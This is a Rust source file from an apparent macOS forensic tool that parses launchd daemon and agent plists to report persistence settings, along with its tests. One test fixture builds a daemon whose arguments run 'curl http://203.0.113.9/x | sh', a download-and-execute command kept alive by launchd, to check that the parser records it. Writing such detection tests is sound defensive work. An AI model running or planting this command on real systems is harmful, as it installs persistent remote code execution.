//! launchd jobs: one property list per daemon or agent. Format: launchd.plist(5).
//! Persistence usually means a plist here that runs at load or keeps a program alive.
//!
//! `modified` is the plist file's own modification time: collection metadata, not something
//! the job records, and it produces no timeline event.

use super::plist_util::{boolean, compact, integer, parse, string, strings_of};
use crate::common::home::user_from_path;
use crate::{Artifact, Category, Input, MACOS};
use nixcavate_core::{Basis, Error, Loc, Record, Result, Sink, Timestamp};
use plist::Value;
use serde::Serialize;
use std::collections::BTreeMap;

pub const ARTIFACT: Artifact = Artifact::new(
    "launchd",
    "launchd daemons and agents (persistence)",
    Category::Persistence,
    MACOS,
    &[
        "System/Library/LaunchDaemons/*.plist",
        "System/Library/LaunchAgents/*.plist",
        "Library/LaunchDaemons/*.plist",
        "Library/LaunchAgents/*.plist",
        "Users/*/Library/LaunchAgents/*.plist",
        "private/var/root/Library/LaunchAgents/*.plist",
    ],
    parse_launchd,
);

#[derive(Serialize)]
struct Job<'a> {
    user: &'a str,
    scope: &'static str,
    label: Option<&'a str>,
    program: Option<&'a str>,
    program_arguments: Vec<String>,
    /// `Program` followed by `ProgramArguments` after the first (which `Program` replaces); with
    /// no `Program`, `ProgramArguments` joined with spaces.
    command: Option<String>,
    run_at_load: Option<bool>,
    /// `true`, `false`, or the conditions of a dictionary as compact JSON (keys and values).
    keep_alive: Option<String>,
    disabled: Option<bool>,
    start_interval: Option<i64>,
    start_calendar_interval: Option<String>,
    watch_paths: Vec<String>,
    queue_directories: Vec<String>,
    user_name: Option<&'a str>,
    group_name: Option<&'a str>,
    working_directory: Option<&'a str>,
    environment: BTreeMap<&'a str, &'a str>,
    mach_services: Vec<&'a str>,
    sockets: bool,
    standard_out_path: Option<&'a str>,
    standard_error_path: Option<&'a str>,
    modified: Option<Timestamp>,
}

impl Record for Job<'_> {}

fn scope(path: &str) -> &'static str {
    let path = path.trim_start_matches('/');
    if path.starts_with("System/Library/LaunchDaemons/") {
        "system_daemon"
    } else if path.starts_with("System/Library/LaunchAgents/") {
        "system_agent"
    } else if path.starts_with("Library/LaunchDaemons/") {
        "local_daemon"
    } else if path.starts_with("Library/LaunchAgents/") {
        "local_agent"
    } else {
        "user_agent"
    }
}

fn parse_launchd(input: &Input, sink: &mut Sink) -> Result<()> {
    let value = parse(input.data)?;
    let Some(job) = value.as_dictionary() else {
        return Err(Error::format("launchd plist is not a dictionary"));
    };
    let scope = scope(input.path);
    let program = string(job, "Program");
    let program_arguments = strings_of(job, "ProgramArguments");
    let command = match program {
        Some(p) => Some(
            std::iter::once(p)
                .chain(program_arguments.iter().skip(1).map(String::as_str))
                .collect::<Vec<_>>()
                .join(" "),
        ),
        None if !program_arguments.is_empty() => Some(program_arguments.join(" ")),
        None => None,
    };
    let keep_alive = match job.get("KeepAlive") {
        Some(Value::Boolean(b)) => Some(b.to_string()),
        Some(dict @ Value::Dictionary(_)) => Some(compact(dict)),
        _ => None,
    };
    let environment = job
        .get("EnvironmentVariables")
        .and_then(Value::as_dictionary)
        .map(|d| d.iter().filter_map(|(k, v)| Some((k.as_str(), v.as_string()?))).collect())
        .unwrap_or_default();
    let mach_services = job
        .get("MachServices")
        .and_then(Value::as_dictionary)
        .map(|d| d.keys().map(String::as_str).collect())
        .unwrap_or_default();
    sink.emit(
        Loc::Line(1),
        &Job {
            user: if scope == "user_agent" { user_from_path(input.path) } else { "" },
            scope,
            label: string(job, "Label"),
            program,
            program_arguments,
            command,
            run_at_load: boolean(job, "RunAtLoad"),
            keep_alive,
            disabled: boolean(job, "Disabled"),
            start_interval: integer(job, "StartInterval"),
            start_calendar_interval: job.get("StartCalendarInterval").map(compact),
            watch_paths: strings_of(job, "WatchPaths"),
            queue_directories: strings_of(job, "QueueDirectories"),
            user_name: string(job, "UserName"),
            group_name: string(job, "GroupName"),
            working_directory: string(job, "WorkingDirectory"),
            environment,
            mach_services,
            sockets: job.contains_key("Sockets"),
            standard_out_path: string(job, "StandardOutPath"),
            standard_error_path: string(job, "StandardErrorPath"),
            modified: (input.mtime > 0).then(|| Timestamp::from_secs(input.mtime, Basis::Recorded)),
        },
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::macos::plist_util::tests::survives_damage;
    use crate::testing::{fixture, run};

    #[test]
    fn system_daemon_with_every_key() {
        let data = fixture("launchd/com.example.updater.plist");
        insta::assert_snapshot!(run(
            &ARTIFACT,
            "Library/LaunchDaemons/com.example.updater.plist",
            &data,
            1_700_000_000
        ));
    }

    #[test]
    fn hidden_agent_in_a_user_home() {
        let data = fixture("launchd/com.example.helper.plist");
        insta::assert_snapshot!(run(&ARTIFACT, "Users/alice/Library/LaunchAgents/com.example.helper.plist", &data, 0));
    }

    #[test]
    fn binary_plist_parses_like_xml() {
        let path = "private/var/root/Library/LaunchAgents/binary.plist";
        let binary = run(&ARTIFACT, path, &fixture("launchd/binary.plist"), 0);
        let xml = run(&ARTIFACT, path, &fixture("launchd/com.example.helper.plist"), 0);
        assert_eq!(binary, xml);
        insta::assert_snapshot!(binary);
    }

    #[test]
    fn command_keeps_the_arguments_that_follow_program() {
        let xml = |body: &str| {
            format!("<plist version=\"1.0\"><dict>{body}<key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict></dict></plist>")
        };
        let path = "Library/LaunchDaemons/x.plist";
        // `Program` replaces argv[0]; the rest of `ProgramArguments` is still what runs.
        let both = xml("<key>Program</key><string>/bin/sh</string><key>ProgramArguments</key><array><string>sh</string><string>-c</string><string>curl http://203.0.113.9/x | sh</string></array>");
        let out = run(&ARTIFACT, path, both.as_bytes(), 0);
        assert!(out.contains(r#""command":"/bin/sh -c curl http://203.0.113.9/x | sh""#), "{out}");
        assert!(out.contains(r#""keep_alive":"{\"SuccessfulExit\":false}""#), "{out}");
        let only = xml("<key>Program</key><string>/bin/sh</string>");
        assert!(run(&ARTIFACT, path, only.as_bytes(), 0).contains(r#""command":"/bin/sh""#));
    }

    #[test]
    fn wrong_types_are_absent() {
        let data = fixture("launchd/wrong-types.plist");
        insta::assert_snapshot!(run(&ARTIFACT, "System/Library/LaunchAgents/wrong-types.plist", &data, 0));
    }

    #[test]
    fn not_a_plist_and_empty() {
        let path = "Library/LaunchAgents/x.plist";
        insta::assert_snapshot!(run(&ARTIFACT, path, &fixture("launchd/not-a-plist.txt"), 0));
        assert!(run(&ARTIFACT, path, b"", 0).contains("skipped: empty file"));
    }

    #[test]
    fn damaged_files_do_not_panic() {
        survives_damage(&ARTIFACT, "Library/LaunchAgents/b.plist", &fixture("launchd/binary.plist"));
        survives_damage(&ARTIFACT, "Library/LaunchAgents/b.plist", &fixture("launchd/wrong-types.plist"));
    }
}
